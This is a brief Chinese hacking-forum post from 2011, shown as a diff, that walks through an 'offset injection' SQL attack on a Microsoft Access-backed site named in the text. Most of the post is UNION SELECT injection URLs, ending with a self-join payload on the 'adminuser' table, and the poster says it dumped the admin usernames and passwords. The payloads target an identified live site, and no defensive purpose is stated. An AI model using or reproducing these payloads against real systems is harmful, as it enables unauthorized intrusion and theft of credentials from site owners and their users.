@@ -1,0 +1,10 @@
+原创】] access 偏移注入
+本帖最后由 desperado 于 2011-10-12 19:31 编辑 
+
+目标:http://www.hoyu456.com/ProView.asp?id=211 表段为adminuser
+用工具检测只出来了一个ID字段.我们来偏移注入吧。oh yeah...
+http://www.hoyu456.com/ProView.asp?id=211+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13+from+adminuser
+http://www.hoyu456.com/ProView.asp?id=211+and+1=2+union+select+1,2,3,4,5,6,7,*+from+adminuser adminuser 这个表占了6个字段,爆出了密码
+但是帐号没爆出来.
+http://www.hoyu456.com/ProView.asp?id=211+and+1=2+union+select+1,*+from+(adminuser%20as%20a%20inner%20join%20adminuser%20as%20b%20on%20a.id=b.id)
+帐号密码全出来了。 
